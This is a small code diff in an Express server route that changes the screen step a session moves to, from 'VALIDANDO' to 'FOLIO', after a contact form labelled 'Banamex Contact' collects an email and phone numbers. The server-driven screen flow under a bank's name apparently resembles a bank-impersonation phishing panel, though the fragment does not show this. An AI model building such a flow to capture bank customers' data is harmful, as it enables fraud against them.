@@ -930,7 +930,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         correoContacto,
         celularContacto,
         telefonoAlternativoContacto: telefonoAlternativoContacto || '',
-        pasoActual: ScreenType.VALIDANDO,
+        pasoActual: ScreenType.FOLIO,
       });
 
       console.log(`[Banamex Contact] Formulario de contacto recibido - Session: ${sessionId}`);
